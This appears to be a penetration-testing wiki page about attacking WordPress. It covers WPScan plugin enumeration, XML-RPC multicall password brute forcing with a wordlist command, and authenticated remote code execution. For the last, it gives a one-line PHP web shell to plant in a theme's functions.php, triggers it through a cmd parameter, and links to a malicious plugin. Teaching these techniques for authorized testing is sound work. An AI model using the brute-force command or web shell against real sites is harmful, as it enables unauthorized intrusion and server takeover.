---
description: A popular Content Management System (CMS) for static content, with a visual UI
---

# WordPress

## # Related Pages

{% content-ref url="../php.md" %}
[php.md](../php.md)
{% endcontent-ref %}

## WPScan

The state-of-the-art security scanner for WordPress is `wpscan`, checking and enumerating many different vulnerabilities from plugins, backup files, and other WordPress-specific errors.&#x20;

{% embed url="https://wpscan.com/wordpress-cli-scanner" %}
WordPerss security scanner
{% endembed %}

See the [API Setup](https://github.com/wpscanteam/wpscan?tab=readme-ov-file#optional-wordpress-vulnerability-database-api) for instructions on how to use their API to get real-time updates of vulnerability data such as versions of plugins. This is highly recommended to make sure you find the newest CVEs.

The following command starts such a scan with extra options enabled and writes the output to a file:

{% code overflow="wrap" %}
```bash
wpscan --url http://$IP --enumerate p --plugins-detection aggressive -o wpscan.txt
```
{% endcode %}

The results of such a scan often reveal outdated plugins with vulnerabilities, and/or generic misconfigurations to exploit. Use a search engine here when unsure about exploiting a certain finding.

## XML RPC Brute Force

One vulnerability that is infamous with WordPress is the `/xmlrpc.php` file being public. But what is the real risk you may ask? The main risk is the `system.multicall()` function that you can interact with to send multiple XML RPC requests simultaneously, and the server will process them all separately.&#x20;

You can imagine that for a heavy request, this can amplify one request into a ton of load on the server, possibly resulting in a **Denial of Service** (DoS). Another idea is using the fact that you can send lots of request at the same time to bypass a rate limit, for password attempts, for example. There exists an RPC call to log in with a username and password to the administrator panel, and with this technique you can do so hundreds of times in one request, significantly speeding up the process ([more details](https://blog.cloudflare.com/a-look-at-the-new-wordpress-brute-force-amplification-attack/)).

The following tool implements this idea by guessing many passwords from a wordlist:

{% embed url="https://github.com/aress31/xmlrpc-bruteforcer" %}
Tool to brute force WordPress passwords using XML RPC multicall
{% endembed %}

```bash
xmlrpc-bruteforcer -u $USERNAME -w /list/rockyou.txt -x http://$IP/xmlrpc.php
```

## Authenticated RCE

When authenticated **as an admin**, you can make any changes to the site. This also means you can edit the PHP code that is executed whenever a page is visited, allowing you to write code that executes shell commands.

You should be able to access **Tools** -> **Theme File Editor** to edit the current theme:

```bash
$BASE_URL/wp-admin/theme-editor.php
```

Then, select any `.php` file you think will be executed when you visit a page. By default, there is a `functions.php` file that every other file includes, so it will always be run. Edit such a file to include any PHP code you want to execute:

```php
<?php
system($_GET["cmd"]);
```

After saving, you should be able to access the page to run the code:

```bash
$BASE_URL/?cmd=id
```

{% hint style="warning" %}
If this does not work for any reason, alternatives include the **Tools** -> **Plugin File Editor** with any plugin, then activate it at **Plugins** -> **Installed Plugins** to trigger the code:

<pre class="language-php"><code class="lang-php"><strong>&#x3C;?php
</strong><strong>system("id > /tmp/pwned");
</strong></code></pre>

As a last option, you can always upload your own malicious plugin like this:\
[https://github.com/wetw0rk/malicious-wordpress-plugin](https://github.com/wetw0rk/malicious-wordpress-plugin)
{% endhint %}
